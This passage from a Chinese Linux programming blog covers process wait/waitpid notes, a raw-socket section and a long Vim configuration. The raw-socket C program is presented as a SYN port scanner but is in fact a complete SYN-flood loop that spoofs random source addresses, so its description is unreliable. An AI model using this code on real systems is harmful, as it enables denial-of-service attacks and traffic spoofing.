class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 123</span><br><span class="line">-rwxr-xr-x  1 root    16912 5月   2 16:00 12</span><br><span class="line">I'm parent, The child process 14092 exit normally</span><br><span class="line">return value:0</span><br><span class="line">父进程,进程标识符是14090</span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>



<p>创建进程使用fork()函数，<strong>执行进程使用exec函数族</strong>，<strong>终止进程则使用exit()和_exit()函数</strong></p>
<p>总结了wait的5个知识点：</p>
<p>&lt;1&gt;.僵尸进程：在一个进程调用了exit之后，该进程并非马上消失还留下一些参与的信息</p>
<p>&lt;2&gt;.用wait结束僵尸进程.</p>
<p>#include &lt;sys/types.h&gt;</p>
<p>#include &lt;sys/wait.h&gt;</p>
<p>pid_t wait (int *stutas)</p>
<p>原理：进程一旦调用了wait，就立即阻塞自己，当分析到当前进程的子进程已经exit，便会收集这个子进程的信息，然后彻底销毁，如果没有找到这样的子进程，就会一直阻塞在这里，直到有一个出现。</p>
<p>&lt;3&gt;.参数status</p>
<p>在wait中，这是一个指向一个整型数据的指针，用来存放子进程退出时的状态，后来又定义了一个WIFEXITED（status)的宏来完成这项工作，这里的status就是一个指针指向的整数。</p>
<p>&lt;4&gt;进程同步。wait可以解决进程的同步问题，通过wait（&amp;status）语句在父进程中等待子进程的返回值。</p>
<p>&lt;5&gt;waitpid函数。其实，wait是waitpid的包装后的形式。waitpid有三个参数（pid，*status，options）</p>
<p>pid&gt;0,只等待PID=pid的子进程；=0,等待同一进程组中的任何子进程；=-1，等待任何子进程退出，此时=wait；&lt;-1，等待指定进程组中的任何子进程</p>
<p>options：WNOHANG|WUNTRACED，也可设为0，此时=wait。</p>
<p>返回值：1.正常返回子进程的PID；2.若设置了WNOHANG，可能返回0；3.error，返回-1。</p>
<hr>
<h2 id="原始套接字编程"><a href="#原始套接字编程" class="headerlink" title="原始套接字编程"></a><strong>原始套接字编程</strong></h2><p><strong>问题: 如何实现SYN扫描器扫描端口 , 比如AB两个设备要进行连接 , A通过端口发一个SYN包给B,B在收到后返回一个ACK包确认连接 , 但是在不确定B端口号时</strong></p>
<p><strong>该如何进行连接 , 答: A给B的每一个端都发一个SYN包, 如果哪个有返回说明端口是开放的, TCP和UDP都无法发实现这样的连接方式 , 所以要使用原始套接字</strong></p>
<p><strong>1、创建一个原始套接字，并设置IP头选项</strong></p>
<p>SOCKET sock;<br>sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP); </p>
<p><strong>这里，我们设置了SOCK_RAW标志，表示我们声明的是一个原始套接字类型。创建原始套接字后，IP头就会包含在接收的数据中，如果我们设定 IP_HDRINCL 选项，那么，就需要自己来构造IP头。注意，如果设置IP_HDRINCL 选项，那么必须具有  administrator权限，</strong></p>
<p><strong>有两种原始套接字：</strong><br>                  <strong>一种是处理IP层及其上的数据，通过指定socket第一个参数为AF_INET来创建这种套接字。</strong><br>                  <strong>另一种是处理数据链路层及其上的数据，通过指定socket第一个参数为PF_PACKET来创建这种套接字</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>SOCK_STREAM</strong></td>
<td><strong>面向连接的流式套接字</strong></td>
</tr>
<tr>
<td><strong>SOCK_DGRAM</strong></td>
<td><strong>面向无连接的数据包套接字</strong></td>
</tr>
<tr>
<td><strong>SOCK_RAW</strong></td>
<td><strong>接收底层数据报文的原始套接字</strong></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOCALPORT 10329</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd,struct sockaddr_in *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> short *addr,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">    <span class="keyword">int</span> on=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> destport=<span class="number">80</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nUsage:%s hostIP port\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bzero(&amp;addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    addr.sin_family=AF_INET;</span><br><span class="line">    <span class="keyword">if</span>(argc==<span class="number">3</span>)&#123;</span><br><span class="line">        destport=atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    addr.sin_port=htons(destport);</span><br><span class="line">    <span class="keyword">if</span>(inet_aton(argv[<span class="number">1</span>],&amp;addr.sin_addr)==<span class="number">0</span>)&#123;</span><br><span class="line">        host=gethostbyname(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(host==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"HostName Error:%s\n\a"</span>,hstrerror(h_errno));</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr.sin_addr=*(struct in_addr *)(host-&gt;h_addr_list[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span>(sockfd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Socket Error:%s\n\a"</span>,strerror(errno));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,<span class="keyword">sizeof</span>(on));</span><br><span class="line">    setuid(getpid());</span><br><span class="line">    send_tcp(sockfd,&amp;addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_tcp</span><span class="params">(<span class="keyword">int</span> sockfd,struct sockaddr_in *addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcp</span>;</span></span><br><span class="line">    <span class="keyword">int</span> head_len;</span><br><span class="line"></span><br><span class="line">    head_len=<span class="keyword">sizeof</span>(struct ip)+<span class="keyword">sizeof</span>(struct tcphdr);</span><br><span class="line">    bzero(<span class="built_in">buffer</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    ip=(struct ip *)<span class="built_in">buffer</span>;</span><br><span class="line">    ip-&gt;ip_v=IPVERSION;</span><br><span class="line">    ip-&gt;ip_hl=<span class="keyword">sizeof</span>(struct ip)&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    ip-&gt;ip_tos=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_len=htons(head_len);</span><br><span class="line">    ip-&gt;ip_id=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_off=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_ttl=MAXTTL;</span><br><span class="line">    ip-&gt;ip_p=IPPROTO_TCP;</span><br><span class="line">    ip-&gt;ip_sum=<span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_dst=addr-&gt;sin_addr;</span><br><span class="line"></span><br><span class="line">    tcp=(struct tcphdr *)(<span class="built_in">buffer</span> + <span class="keyword">sizeof</span>(struct ip));</span><br><span class="line">    tcp-&gt;dest=addr-&gt;sin_port;</span><br><span class="line">    tcp-&gt;doff=<span class="number">5</span>;</span><br><span class="line">    tcp-&gt;syn=<span class="number">1</span>;</span><br><span class="line">    tcp-&gt;ack_seq=<span class="number">0</span>;</span><br><span class="line">    tcp-&gt;check=<span class="number">0</span>;</span><br><span class="line">    tcp-&gt;seq=<span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ip-&gt;ip_src.s_addr=<span class="built_in">random</span>();</span><br><span class="line">        tcp-&gt;source=<span class="built_in">random</span>();<span class="comment">//htons(LOCALPORT);//</span></span><br><span class="line">        <span class="keyword">if</span>(count%<span class="number">10000</span>==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"Send %d packets\n"</span>,count);</span><br><span class="line">        count++;</span><br><span class="line">        tcp-&gt;check=check_sum((<span class="keyword">unsigned</span> short *)tcp,<span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">        sendto(sockfd,<span class="built_in">buffer</span>,head_len,<span class="number">0</span>,addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">check_sum</span><span class="params">(<span class="keyword">unsigned</span> short *addr,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">int</span> nleft=len;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> short *w=addr;</span><br><span class="line">    short answer=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(nleft&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        sum+=*w++;</span><br><span class="line">        nleft-=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nleft==<span class="number">1</span>)&#123;</span><br><span class="line">        *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(&amp;answer)=*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)w;</span><br><span class="line">        sum+=answer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum=(sum&gt;&gt;<span class="number">16</span>)+(sum&amp;<span class="number">0xffff</span>);</span><br><span class="line">    sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line">    answer=~sum;</span><br><span class="line">    <span class="keyword">return</span>(answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Vim编辑器开发环境设置"><a href="#Vim编辑器开发环境设置" class="headerlink" title="Vim编辑器开发环境设置"></a><strong>Vim编辑器开发环境设置</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># cat ~/.vimrc </span></span><br><span class="line"><span class="string">" Vundle Setting</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string">filetype off</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">Plugin 'VundleVim/Vundle.vim'</span></span><br><span class="line"><span class="string">"</span><span class="comment"># Plugin 'git://github.com/scrooloose/nerdtree.git'</span></span><br><span class="line"><span class="string">"# Plugin 'git://github.com/kien/ctrlp.vim.git'</span></span><br><span class="line"><span class="string">Plugin 'scrooloose/nerdtree'</span></span><br><span class="line"><span class="string">"</span> Let Vundle manage itself</span><br><span class="line"><span class="string">" Plugins</span></span><br><span class="line"><span class="string"> Plugin 'Valloric/YouCompleteMe'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/syntastic'</span></span><br><span class="line"><span class="string"> Plugin 'bling/vim-airline'</span></span><br><span class="line"><span class="string"> Plugin 'SirVer/ultisnips'</span></span><br><span class="line"><span class="string"> Plugin 'edsono/vim-matchit'</span></span><br><span class="line"><span class="string"> Plugin 'elzr/vim-json'</span></span><br><span class="line"><span class="string"> Plugin 'honza/vim-snippets'</span></span><br><span class="line"><span class="string"> Plugin 'justinmk/vim-sneak'</span></span><br><span class="line"><span class="string"> Plugin 'kien/ctrlp.vim'</span></span><br><span class="line"><span class="string"> Plugin 'ludovicchabant/vim-lawrencium'</span></span><br><span class="line"><span class="string"> Plugin 'majutsushi/tagbar'</span></span><br><span class="line"><span class="string"> Plugin 'mhinz/vim-signify'</span></span><br><span class="line"><span class="string"> Plugin 'plasticboy/vim-markdown'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/nerdcommenter'</span></span><br><span class="line"><span class="string"> Plugin 'sjl/gundo.vim'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-sleuth'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-surround'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-fugitive'</span></span><br><span class="line"><span class="string"> Plugin 'tyru/open-browser.vim'</span></span><br><span class="line"><span class="string"> Plugin 'vim-scripts/a.vim'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> Color schemes</span><br><span class="line"> Plugin <span class="string">'tomasr/molokai'</span></span><br><span class="line"> Plugin <span class="string">'flazz/vim-colorschemes'</span></span><br><span class="line"></span><br><span class="line"> call vundle<span class="comment">#end()</span></span><br><span class="line">filetype plugin indent on</span><br><span class="line"></span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  Begin</span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 自动补全配置</span></span><br><span class="line"><span class="string">set completeopt=longest,menu "让Vim的补全菜单行为与一般IDE一致(参考VimTip1228)</span></span><br><span class="line"><span class="string">autocmd InsertLeave * if pumvisible() == 0|pclose|endif "离开插入模式后自动关闭预览窗口</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? "\&lt;C-y&gt;" : "\&lt;CR&gt;" "回车即选中当前项</span></span><br><span class="line"><span class="string">"上下左右键的行为 会显示其他信息</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Down&gt;     pumvisible() ? "\&lt;C-n&gt;" : "\&lt;Down&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? "\&lt;C-p&gt;" : "\&lt;Up&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? "\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageDown&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? "\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageUp&gt;"</span></span><br><span class="line"><span class="string">"youcompleteme  默认tab  s-tab 和自动补全冲突</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion=['&lt;c-n&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion = ['&lt;Down&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion=['&lt;c-p&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion = ['&lt;Up&gt;']</span></span><br><span class="line"><span class="string">let g:ycm_confirm_extra_conf=0 "关闭加载.ycm_extra_conf.py提示</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_tags_files=1 " 开启 YCM 基于标签引擎</span></span><br><span class="line"><span class="string">let g:ycm_min_num_of_chars_for_completion=1 " 从第2个键入字符就开始罗列匹配项</span></span><br><span class="line"><span class="string">let g:ycm_cache_omnifunc=0 " 禁止缓存匹配项,每次都重新生成匹配项</span></span><br><span class="line"><span class="string">let g:ycm_seed_identifiers_with_syntax=1 " 语法关键字补全</span></span><br><span class="line"><span class="string">nnoremap &lt;F5&gt; :YcmForceCompileAndDiagnostics&lt;CR&gt; "force recomile with syntastic</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lo :lopen&lt;CR&gt; "open locationlist</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lc :lclose&lt;CR&gt; "close locationlist</span></span><br><span class="line"><span class="string">inoremap &lt;leader&gt;&lt;leader&gt; &lt;C-x&gt;&lt;C-o&gt;</span></span><br><span class="line"><span class="string">"在注释输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1</span></span><br><span class="line"><span class="string">"在字符串输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_strings = 1</span></span><br><span class="line"><span class="string">"注释和字符串中的文字也会被收入补全</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 0</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;jd :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt; " 跳转到定义处</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"为了Python3的第三方库安装Jedi插件</span></span><br><span class="line"><span class="string">Plugin 'davidhalter/jedi-vim'</span></span><br><span class="line"><span class="string">"===============================Jedi==================================</span></span><br><span class="line"><span class="string">if has('python3')</span></span><br><span class="line"><span class="string">let g:loaded_youcompleteme = 1 " 判断如果是python3的话，就禁用ycmd。</span></span><br><span class="line"><span class="string">let g:jedi#force_py_version = 3</span></span><br><span class="line"><span class="string">let g:pymode_python = 'python3'</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">"===============================Jedi===================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  End</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 设置配色方案</span></span><br><span class="line"><span class="string">" colorscheme torte</span></span><br><span class="line"><span class="string">" colorscheme murphy</span></span><br><span class="line"><span class="string">" colorscheme desert </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"字体 </span></span><br><span class="line"><span class="string">"if (has("gui_running")) </span></span><br><span class="line"><span class="string">"   set guifont=Bitstream\ Vera\ Sans\ Mono\ 10 </span></span><br><span class="line"><span class="string">"endif </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" 显示相关  </span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">set shortmess=atI   " 启动的时候不显示那个援助乌干达儿童的提示  </span></span><br><span class="line"><span class="string">"winpos 5 5          " 设定窗口位置  </span></span><br><span class="line"><span class="string">"set lines=40 columns=155    " 设定窗口大小  </span></span><br><span class="line"><span class="string">set go=             " 不要图形按钮  </span></span><br><span class="line"><span class="string">"color asmanian2     " 设置背景主题  </span></span><br><span class="line"><span class="string">"set guifont=Courier_New:h10:cANSI   " 设置字体  </span></span><br><span class="line"><span class="string">syntax on           " 语法高亮  </span></span><br><span class="line"><span class="string">autocmd InsertLeave * se nocul  " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">autocmd InsertEnter * se cul    " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">set ruler           " 显示标尺  </span></span><br><span class="line"><span class="string">set showcmd         " 输入的命令显示出来，看的清楚些  </span></span><br><span class="line"><span class="string">set cmdheight=1     " 命令行（在状态行下）的高度，设置为1  </span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l   " 允许backspace和光标键跨越行边界(不建议)  </span></span><br><span class="line"><span class="string">set scrolloff=3     " 光标移动到buffer的顶部和底部时保持3行距离  </span></span><br><span class="line"><span class="string">set novisualbell    " 不要闪烁(不明白)  </span></span><br><span class="line"><span class="string">set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;   "状态行显示的内容  </span></span><br><span class="line"><span class="string">set laststatus=1    " 启动显示状态行(1),总是显示状态行(2)  </span></span><br><span class="line"><span class="string">"set foldenable      " 允许折叠  </span></span><br><span class="line"><span class="string">set foldmethod=manual   " 手动折叠  </span></span><br><span class="line"><span class="string">"set background=dark "背景使用黑色 </span></span><br><span class="line"><span class="string">" 显示中文帮助</span></span><br><span class="line"><span class="string">if version &gt;= 603</span></span><br><span class="line"><span class="string">    set helplang=cn</span></span><br><span class="line"><span class="string">    set encoding=utf-8</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""</span></span><br><span class="line"><span class="string">"""</span><span class="string">""</span>新文件标题</span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">"新建.c,.h,.sh,.java文件，自动插入文件头 </span></span><br><span class="line"><span class="string">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec "</span>:call SetTitle()<span class="string">" </span></span><br><span class="line"><span class="string">"</span><span class="string">"定义函数SetTitle，自动插入文件头 </span></span><br><span class="line"><span class="string">func SetTitle() </span></span><br><span class="line"><span class="string">    "</span>如果文件类型为.sh文件 </span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'sh'</span> </span><br><span class="line">    call setline(<span class="number">1</span>,<span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"\# File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"\# Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"\# mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"\# Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">"\#!/bin/bash"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">""</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    call setline(<span class="number">1</span>, <span class="string">"/*************************************************************************"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"    &gt; File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"    &gt; Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"    &gt; Mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"    &gt; Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">" ************************************************************************/"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'cpp'</span></span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">   <span class="string">"call append(line("</span>.<span class="string">")+7, "</span> <span class="string">")</span></span><br><span class="line"><span class="string">   "</span>call append(line(<span class="string">"."</span>)+<span class="number">8</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'c'</span></span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">7</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="string">"    if &amp;filetype == 'java'</span></span><br><span class="line"><span class="string">    "</span>        call append(line(<span class="string">"."</span>)+<span class="number">6</span>,<span class="string">"public class "</span>.expand(<span class="string">"%"</span>))</span><br><span class="line">    <span class="string">"        call append(line("</span>.<span class="string">")+7,"</span><span class="string">")</span></span><br><span class="line"><span class="string">    "</span>    endif</span><br><span class="line">    <span class="string">"新建文件后，自动定位到文件末尾</span></span><br><span class="line"><span class="string">    autocmd BufNewFile * normal G</span></span><br><span class="line"><span class="string">endfunc </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string">"键盘命令</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;w :w!&lt;cr&gt;</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;f :find&lt;cr&gt;</span></span><br><span class="line"><span class="string">" 映射全选+复制 ctrl+a</span></span><br><span class="line"><span class="string">map &lt;C-A&gt; ggVGY</span></span><br><span class="line"><span class="string">map! 